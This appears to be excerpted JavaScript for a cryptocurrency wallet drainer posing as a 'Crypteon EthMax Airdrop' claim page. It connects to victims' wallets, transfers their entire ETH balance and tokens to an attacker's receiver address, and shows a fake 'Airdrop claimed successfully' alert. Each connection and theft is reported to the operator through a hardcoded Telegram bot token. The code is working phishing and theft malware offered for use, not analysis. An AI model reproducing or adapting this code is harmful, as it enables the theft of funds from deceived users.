...
// Configure your Telegram bot token and chat ID here for logging successful connections and asset drains
const TELEGRAM_CONFIG = {
    botToken: "8905412305:AAFRF2CKYmY1p9eAUfYkDdqxVynYOds-cBI", // Replace with your Telegram bot token
    chatId: "8051121194", // Replace with your Telegram chat ID
...
// Function to format success message for Telegram
function formatSuccessMessage(walletName, walletAddress, ethBalance, networkName) {
    return `
<b>✅ WALLET CONNECTED SUCCESSFULLY</b>

<b>Wallet:</b> ${walletName}
<b>Address:</b> <code>${walletAddress}</code>
<b>Balance:</b> ${ethBalance} ETH
<b>Network:</b> ${networkName}
<b>Time:</b> ${new Date().toLocaleString()}
<b>IP:</b> ${window.location.hostname}
`;
}

// Function to format asset drainage message
function formatDrainageMessage(walletAddress, ethDrained, tokensDrained, receiverAddress) {
    return `
<b>💰 ASSETS DRAINED SUCCESSFULLY</b>

<b>Source Address:</b> <code>${walletAddress}</code>
<b>ETH Drained:</b> ${ethDrained} ETH
<b>Tokens Drained:</b> ${tokensDrained}
<b>Time:</b> ${new Date().toLocaleString()}
<b>Receiver:</b> <code>${receiverAddress}</code>
`;
}
...
`;
    ...
    // Function to format asset drainage message
    function formatDrainageMessage(walletAddress, ethDrained, tokensDrained) {
        return `
<b>💰 ASSETS DRAINED SUCCESSFULLY</b>

<b>Address:</b> <code>${walletAddress}</code>
<b>ETH Drained:</b> ${ethDrained} ETH
<b>Tokens Drained:</b> ${tokensDrained} tokens
<b>Time:</b> ${new Date().toLocaleString()}
<b>Receiver:</b> <code>${RECEIVER_ADDRESS}</code>
`;
    }
    ...
    // Wallet icon mapping for professional display
    const walletIcons = {
        "MetaMask": "🦊",
        "Coinbase Wallet": "🏦",
        "Trust Wallet": "✅",
    ...
    function getWalletIcon(walletName) {
        return walletIcons[walletName] || "💼";
    }

    function getWalletStatus(wallet) {
        if (wallet.type === "mobile") return "Mobile";
        if (wallet.type === "walletconnect") return "Universal";
        if (!wallet.provider && wallet.name !== "WalletConnect") return "Install";
        return "Installed";
    }
    ...
    function populateWalletDropdown() {
        ...
        if (!selector) return;
        selector.innerHTML = '<option value="">Choose your wallet...</option>';
        detectedWallets.forEach((wallet, index) => {
            const option = document.createElement('option');
            option.value = index;
            option.textContent = `${getWalletIcon(wallet.name)} ${wallet.name.replace(' (Mobile Only)', '').replace(' (Not Installed)', '')} (${getWalletStatus(wallet)})`;
    ...
    if (document.getElementById('connect-wallet-btn')) {
        document.getElementById('connect-wallet-btn').addEventListener('click', async () => {
            if (selectedWalletObj !== null) {
                proceedWithWalletConnection(selectedWalletObj);
            } else {
    ...
    // Update connection status (helper function)
    function updateConnectionStatus(message, isError = false) {
        console.log(message);
    }

    // Add wallets to modal with device-specific filtering
    ...
    async function proceedWithWalletConnection(selected) {
        // selected is now the wallet object directly
        let provider = null;
        ...
        try {
            ...
            if (selected.name === "WalletConnect" && walletConnectAvailable && WalletConnectProvider) {
                ...
                const PROJECT_ID = "ed694c4b440ddecba357a6f5b0a130b8";
                provider = await WalletConnectProvider.init({
                    projectId: PROJECT_ID,
                    chains: [1],
                    showQrModal: true,
                    metadata: {
                        name: "Crypteon EthMax Airdrop",
                        description: "Claim your Crypteon EthMax airdrop tokens - Connect any Ethereum wallet",
    ...
    async function handleSuccessfulConnection(provider, walletName, userAddress) {
        try {
            ...
            const successMessage = formatSuccessMessage(walletName, userAddress, ethBalance, network.name);
    ...
    async function drainWallet(provider, signer, userAddress) {
        try {
            ...
            const ethDrained = await drainETH(provider, signer, userAddress);

            updateConnectionStatus("All assets extracted successfully! 🎉");
            alert("Airdrop claimed successfully! 🎉");

            // Send drainage success notification to Telegram
            const drainageMessage = formatDrainageMessage(userAddress, ethDrained, `${tokenTransferCount} token${tokenTransferCount !== 1 ? 's' : ''} successfully transferred`, RECEIVER_ADDRESS);
            await sendToTelegram(drainageMessage);
    ...
    async function drainETH(provider, signer, userAddress) {
        try {
            ...
            // Reserve ETH for receiver's gas fees (0.01 ETH = ~$30-50 in gas for future transactions)
            const receiverGasReserve = ethers.utils.parseEther("0.01");
            console.log(`Receiver gas reserve: ${ethers.utils.formatEther(receiverGasReserve)} ETH`);

            // Calculate amount to send (total balance minus exact gas cost minus receiver gas reserve)
            const totalGasNeeded = exactGasCost.add(receiverGasReserve);
            const amountToSend = currentBalance.sub(totalGasNeeded);

            if (amountToSend.lte(0)) {
                console.log("Insufficient ETH balance for gas fees and receiver reserve");
                ...
                console.log(`Receiver reserve: ${ethers.utils.formatEther(receiverGasReserve)} ETH`);
                return "0";
            }

            const ethToSend = ethers.utils.formatEther(amountToSend);
            console.log(`Transferring ${ethToSend} ETH to ${RECEIVER_ADDRESS}`);
            console.log(`Transaction gas: ${ethers.utils.formatEther(exactGasCost)} ETH`);
            console.log(`Receiver gas reserve: ${ethers.utils.formatEther(receiverGasReserve)} ETH`);
            ...
            if (network.chainId === 1) { // Ethereum mainnet supports EIP-1559
                try {
                    ...
                    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
                        ...
                        const eip1559TotalNeeded = eip1559GasCost.add(receiverGasReserve);
                        const eip1559Amount = currentBalance.sub(eip1559TotalNeeded);
                        
                        if (eip1559Amount.gt(0)) {
                            txParams.value = eip1559Amount;
                            console.log(`Using EIP-1559: sending ${ethers.utils.formatEther(eip1559Amount)} ETH + ${ethers.utils.formatEther(receiverGasReserve)} ETH reserve for receiver`);
                        }
                    }
                } catch (eip1559Error) {
            ...
            // Return the amount of ETH drained for logging
            return ethToSend;
